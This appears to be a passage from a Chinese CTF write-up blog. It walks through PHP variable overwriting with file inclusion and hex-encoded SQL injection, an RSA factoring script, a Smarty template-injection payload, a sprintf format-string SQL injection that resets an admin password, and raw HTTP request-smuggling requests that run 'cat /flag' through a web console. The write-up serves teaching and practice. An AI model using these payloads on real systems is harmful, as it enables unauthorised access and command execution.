$_GET = waf($_GET);</span><br><span class="line"></span><br><span class="line">    $role = <span class="number">1</span>;</span><br><span class="line">    $table = <span class="string">"users"</span>;</span><br><span class="line"></span><br><span class="line">    extract($_POST,EXTR_SKIP);</span><br><span class="line">    extract($_GET,EXTR_SKIP);</span><br></pre></td></tr></table></figure>

<p>利用<code>waf</code>函数，将<code>POST与GET</code>的数组变量进行<code>addslashes</code>函数过滤单引号，双引号，反斜杠，而且这里的extract函数多了一个<code>EXTR_SKIP</code>参数，则表示此文件中传入的POST与GET变量不可覆盖，并且给<strong>$role赋值了1</strong>(这里后面会用到).</p>
<p><strong>config.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $servername = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">private</span> $passwd = <span class="string">"**********"</span>;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;servername, <span class="keyword">$this</span>-&gt;name, <span class="keyword">$this</span>-&gt;passwd);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"conn error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_select_db(<span class="keyword">$this</span>-&gt;conn,<span class="string">'12_29_web'</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getone</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">        $row = mysqli_fetch_array($result);</span><br><span class="line">        <span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($sql)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此文件用于与数据库建立，可以序列化的重要性，又提供了数据库两个查询接口函数</p>
<p><strong>register.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;$_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $sql_ = <span class="string">"select * from users where username='$username'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $row = $db-&gt;getone($sql_);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($row))&#123;</span><br><span class="line">            $sql_ = <span class="string">"insert into users (username,password,role) values('$username','$password',$role)"</span>;</span><br><span class="line">            $db-&gt;register($sql_);</span><br><span class="line">            header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>主要逻辑就是注册功能，先从数据库查找一下有没有注册的账户名密码，没有的话插入数据库完成注册</p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;$_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">        $sql_ = <span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $row = $db-&gt;getone($sql_);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($row))&#123;</span><br><span class="line">            session_start();</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line">            header(<span class="string">"Location: info.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>程序逻辑就是看有无<code>post</code>这个用户，有的话跳转到<code>info.php</code>页面，这个程序是存在一些漏洞的，<strong>如果可控制$tem参数，则可造成任意文件包含。</strong></p>
<p><strong>info.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $sql_ = <span class="string">"select * from users where username='$username'"</span>;</span><br><span class="line">    $db = <span class="keyword">new</span> sql();</span><br><span class="line">    $row = $db-&gt;getone($sql_);</span><br><span class="line">    $username = $row[<span class="string">'username'</span>];</span><br><span class="line">    $role = $row[<span class="string">'role'</span>];</span><br><span class="line">    $sql_ = <span class="string">"select info from info where role='$role'"</span>;</span><br><span class="line">    $row = $db-&gt;getone($sql_);</span><br><span class="line">    $info = $row[<span class="string">'info'</span>];</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"template/info.php"</span>);</span><br></pre></td></tr></table></figure>

<p>通过数据库查询语句回显信息的文件</p>
<p><strong>edit_info.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($role))&#123;</span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        $role = addslashes($role);</span><br><span class="line">        $sql_ = <span class="string">"update users set role=$role where username='$username'"</span>;</span><br><span class="line">        $db = <span class="keyword">new</span> sql();</span><br><span class="line">        $db-&gt;register($sql_);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里文件功能为更新用户信息，漏洞点在于extract处，产生变量覆盖。</p>
<h4 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h4><p>在edit_info.php中进行变量覆盖$role值，$role值覆盖为注入语句的十六进制值，绕过<code>is_numeric($role)</code>,update的语句会将十六进制值转化为对应的字符串，进而在info.php中<code>$sql_ = &quot;select info from info where role=&#39;$role&#39;&quot;</code>产生注入，得到值。</p>
<p>但是这里存在一个问题如果我们在edit_info.php中直接传入role值去覆盖，则不会产生覆盖的结果，原因如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到这个代码的执行顺序，先进行变量覆盖，再进行文件包含，在<code>common.php</code>中给<code>$role</code>赋值为1，所以我们的十六进制注入语句不会生效。接下来寻找一下绕过点，发现在<code>index.php</code>中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($tem))&#123;</span><br><span class="line"> <span class="keyword">require</span>(<span class="string">"template/$tem.php"</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">require</span>(<span class="string">"template/index.php"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这个就是我们之前提起的有文件包含漏洞的文件，如果我们去包含一下<code>edit_info.php</code>,执行顺序则变成了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//包含进来的文件</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br></pre></td></tr></table></figure>

<p><code>require_once</code>函数只能进行包含一次文件，所以我们实际上执行语句如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//包含进来的文件</span></span><br><span class="line">extract($_GET);</span><br></pre></td></tr></table></figure>

<p>即成功进行变量覆盖，绕过了$role=1的限制。然后将我们构造好的注入语句转化为16进制，update将16进制数据转化为字符串，最终在<code>info.php</code>中<code>select info from info where role=&#39;$role&#39;&quot;</code>中产生注入数据，得到flag。</p>
<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><strong>Crypto1</strong></p>
<p>已经e,d,n,求p,q,脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span>  </span><br><span class="line">   <span class="keyword">if</span> a &lt; b:  </span><br><span class="line">     a, b = b, a  </span><br><span class="line">   <span class="keyword">while</span> b != <span class="number">0</span>:  </span><br><span class="line">     temp = a % b  </span><br><span class="line">     a = b  </span><br><span class="line">     b = temp  </span><br><span class="line">   <span class="keyword">return</span> a    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n,e,d)</span>:</span>  </span><br><span class="line">    p = <span class="number">1</span>  </span><br><span class="line">    q = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span>:  </span><br><span class="line">        k = d * e - <span class="number">1</span>  </span><br><span class="line">        g = random.randint ( <span class="number">0</span> , n )  </span><br><span class="line">        <span class="keyword">while</span> p==<span class="number">1</span> <span class="keyword">and</span> q==<span class="number">1</span> <span class="keyword">and</span> k % <span class="number">2</span> == <span class="number">0</span>:  </span><br><span class="line">            k /= <span class="number">2</span>  </span><br><span class="line">            y = pow(g,k,n)  </span><br><span class="line">            <span class="keyword">if</span> y!=<span class="number">1</span> <span class="keyword">and</span> gcd(y<span class="number">-1</span>,n)&gt;<span class="number">1</span>:  </span><br><span class="line">                p = gcd(y<span class="number">-1</span>,n)  </span><br><span class="line">                q = n/p  </span><br><span class="line">    <span class="keyword">return</span> p,q    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>  </span><br><span class="line">    n =<span class="number">0x8189919220df44ed66be4e916c99d8c34b81acaa20427d9f34bcf137d6fba2b3d58bccdc2aa579d4ad29edf43c2a82f949a62ea625e1bf347a39a5082fb4dae1f96761b0d300bbd721756661413d1bad777ee2e1398809c902738b3edd52a8cf290cd3925b3db19822947fa3e117bca67f0240c03436ea0f1506147f65aae7eb5b8681fe209edb895ebfd4c79d12198c139508d1d0ab191f45c169f3f6da1429e6de4149ec4e90ae5c4746fc01c69f300464b9e91553de43d045c060c93ab538fd430f34ad4c930bfb6c52a03b6f8dfe75953ece44837e5ec4d39bf93e4f6282c2d8865a7fb04a8371249eba1cd55be10a7db12b673d9fb1ff619ad25dbaec65</span></span><br><span class="line">    e =<span class="number">0x10001</span></span><br><span class="line">    d =<span class="number">0x4aefe3a7ce9e7b087f8c8e7530875bcfb6e9a09296b1006d4e9c134bc371b53125d38742c2e511b2c82e5e7b112762b78634bdfdde225773ab5597b441acf5870eba10d8b36854426317c08f78a73a50c2b543d919682a88ff830a45e6d17fd8c01dac739996fa1b51bde88d4c9567cc45e36ec40230d67cbd23d44dd2e9e8d9fb1714050630f394d07de6688d0e37678267d0080c442b61ce608bb9057aa5907be6862ab1e57b0644d6ec2f602040ddcd9643e49999248fd3872dc4e496d74bebee1029c8cfa498e1b4f4f5c9cf3660f2776c72a3876a61b9544ac53fcf35fedf1a1c8f3027331b22e88c395c697a1436f1dcb8e9f91cf106a993ea69d7dead</span></span><br><span class="line">    p,q = getpq(n,e,d)  </span><br><span class="line">    <span class="comment">#print "p: "+hex(p)</span></span><br><span class="line">    <span class="comment">#print "q: "+hex(q) </span></span><br><span class="line">c=<span class="number">0xbf601e007a3d5e7b6935018e7d434d416ee444b34cf965466bc8c5e41f05523f076d413a183b6a36265933d4d47c095f2261be78ee04c5ba1da24e68817b25386a4facda9187a3b934e38143f03ba7f3fd113e34befbe2b7fc94e875ee7ac5ed85763f6a870fa8acfcd2d39aa88b2276d94e6aa54c596a60e10569af948d106f</span></span><br><span class="line">d=<span class="number">0xad47b81df70b41a2c785414f430cb4ee32e7c0fe6b3201608dd7eb2572f7aaa5edbe23590e83c933a457a224fe6b5c6697819c91b58c454762025a814f1de9c693b503368d103178db40688bd853690a8d86bb190bb44f10e210cc643a21dbfad21c35f40d313e955782731b73dd9a7b31bb288d48e87f1e5b82fae19656d26b</span></span><br><span class="line"><span class="keyword">print</span> md5(str(c+d)).hexdigest()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>解得<code>flag:e7ddad281ff7dfc99eb3379e0efd46f8</code></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019D^3CTF 题目复现</title>
    <url>/2019/11/28/2019D-3CTF-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末去打了比赛，也就错过了这个高质量比赛，所以特地来复现一下，题目真的很不错，出题师傅们辛苦了，不过并没有都复现完，最后有一些环境都关掉了，我对那个csp bypass蛮感兴趣的，如果放了环境的话，可以再复现一下。</p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>index函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;session-&gt;has_userdata(<span class="string">'userId'</span>)) &#123;</span><br><span class="line">		$userView = <span class="keyword">$this</span>-&gt;Render_model-&gt;get_view(<span class="keyword">$this</span>-&gt;session-&gt;userId);</span><br><span class="line">		$prouserView = <span class="string">'data:,'</span> . $userView;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;username = <span class="keyword">array</span>(<span class="string">'username'</span> =&gt; <span class="keyword">$this</span>-&gt;getUsername(<span class="keyword">$this</span>-&gt;session-&gt;userId));</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ci_smarty-&gt;assign(<span class="string">'username'</span>, <span class="keyword">$this</span>-&gt;username);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ci_smarty-&gt;display($prouserView);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		redirect(<span class="string">'/user/login'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进get_view函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_view</span><span class="params">($userId)</span></span>&#123;</span><br><span class="line">	$res = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT username FROM userTable WHERE userId='$userId'"</span>)-&gt;result();</span><br><span class="line">	<span class="keyword">if</span>($res)&#123;</span><br><span class="line">		$username = $res[<span class="number">0</span>]-&gt;username;</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;sql_safe($username);</span><br><span class="line">		$username = <span class="keyword">$this</span>-&gt;safe_render($username);</span><br><span class="line">		$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br><span class="line">		$userView = $userView[<span class="number">0</span>]-&gt;userView;</span><br><span class="line">		<span class="keyword">return</span> $userView;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sql_safe与safe_render函数如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_render</span><span class="params">($username)</span></span>&#123;</span><br><span class="line">	$username = str_replace(<span class="keyword">array</span>(<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>),<span class="string">''</span>,$username);</span><br><span class="line">	<span class="keyword">return</span> $username;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/and|or|order|delete|select|union|load_file|updatexml|\(|extractvalue|\)/i'</span>,$sql))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $sql;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就会产生一个问题，我们可以通过un{ion这样的形式来bypass union select的过滤，并且可以通过username处的注入点来union select 进smarty模板注入的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$userView = <span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"SELECT userView FROM userRender WHERE username='$username'"</span>)-&gt;result();</span><br></pre></td></tr></table></figure>

<p>payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">test<span class="string">' union select 0x7b7b7068707d7d706870696e666f28293b7b7b2f7068707d7d # //十六进制转字符串为&#123;&#123;php&#125;&#125;phpinfo();&#123;&#123;/php&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>登陆进去后可以看到phpinfo的信息</p>
<p>改一下payload，写个一句话，执行下命令就可以了</p>
<h3 id="Showhub"><a href="#Showhub" class="headerlink" title="Showhub"></a>Showhub</h3><p>首先需要我们拿到admin账号的权限，并且题目给了部分代码，在sql语句部分存在sprintf格式化字符串漏洞，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepareInsert</span><span class="params">($baseSql, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($args)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($args <span class="keyword">as</span> $column =&gt; $value) &#123;</span><br><span class="line">            $value = addslashes($value);</span><br><span class="line">            <span class="keyword">if</span> ($value !== <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($i !== count($args) - <span class="number">1</span>) &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`,%s"</span>, <span class="string">"'$value',%s"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $baseSql = sprintf($baseSql, <span class="string">"`$column`"</span>, <span class="string">"'$value'"</span>);</span><br><span class="line">                &#125; <span class="comment">//INSERT INTO `$this-&gt;tbname`(%s) VALUE(%s)</span></span><br><span class="line">            &#125;</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>参考这篇文章构造</p>
<p><a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="noopener">https://www.cnblogs.com/test404/p/7821884.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin%$&#39;,sleep(3))#</span><br></pre></td></tr></table></figure>

<p>成功延时，存在此注入漏洞，</p>
<p>不过在复现的时候好像环境有点问题，随便admin xxx就可以signup进去admin，在Nu1L的wp的姿势是</p>
<blockquote>
<p>利⽤ ON DUPLICATE KEY UPDATE ,当insert已经存在的记录时，执⾏Update</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;sha256(pass)%1$&#39;#</span><br></pre></td></tr></table></figure>

<p>通过此payload改完密码，以admin的身份进行登陆</p>
<p>登陆进去后有websole,不过需要特定的ip，并且可以看到服务器是Server: ATS/7.1.2，这个服务器是存在http走私漏洞的</p>
<p>通过走私GET请求到webconsole</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 586</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /WebConsole HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">client-ip</span>: x.xxx.xx.x</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>

<p>把代码保存到本地看一下，是个很好看的页面，并且可以看到是通过cmd进行出传参的</p>
<p><a href="https://imgchr.com/i/QpmebV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/27/QpmebV.md.png" alt="QpmebV.md.png"></a></p>
<p>再走私个POST包拿到flag</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3970.5 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/Manage</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 710</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /WebConsole/exec HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ec057b43d9.showhub.d3ctf.io</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Referer</span>: http://ec057b43d9.showhub.d3ctf.io/WebConsole/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=n5codsqicps569k8q4bcpkvbgu</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"></span><br><span class="line">cmd=cat+/flag</span><br></pre></td></tr></table></figure>

<p>这道题在拿这个cmd传参接口的地方有一些不懂的地方，特地请教了一下@Li4n0师傅</p>
<p>这里判断IP的代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)</span><br></pre></td></tr></table></figure>

<p>代码问题为：如果ip不是正确的ipv4格式，这段代码会将其判断为内网ip。</p>
<p>而走私的意义在于，我们的正常请求会被反代把client-ip设置为remote_addr，而我们通过走私就可以自己设置client-ip,通过拼接，最后上述问题代码在处理的时候就会将其判断为内网ip，拿到所需页面</p>
<p>整体思路为走私一个请求使其留在缓冲区，下一次准备请求的时候，这个缓冲区留下的请求就会被发送，比如：</p>
<p><img src="https://s2.ax1x.com/2019/11/27/QC1PoR.jpg" alt="QC1PoR.jpg"></p>
<p>从这张图我们可以清晰的看到上一次留在缓冲区的请求，在这一次被成功发送，并且下面的请求被反代设置了client-ip，所以我们可以通过client-ip的拼接来实现内网ip检测的bypass。</p>
<h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>题目源码</p>
